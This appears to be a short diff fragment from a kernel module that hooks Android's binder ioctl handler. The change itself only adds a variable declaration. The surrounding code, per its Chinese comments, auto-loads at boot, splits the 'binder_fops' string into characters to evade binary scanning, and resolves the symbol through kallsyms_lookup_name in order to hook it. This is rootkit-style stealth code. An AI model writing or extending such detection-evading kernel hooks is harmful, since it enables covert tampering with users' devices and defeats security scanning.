@@ -108,6 +108,7 @@ static long sysop_hooked_binder_ioctl(struct file *file, unsigned int cmd, unsig
 
 // 静态初始化：系统启动自动挂载 - 已重命名
 static int __init sysop_init(void) {
+	int ret;
     // 字符串切片防御：将字符串打散防止二进制扫描
     char fops_name[] = {'b','i','n','d','e','r','_','f','o','p','s','\0'};
     struct file_operations *binder_fops = (struct file_operations *)kallsyms_lookup_name(fops_name);
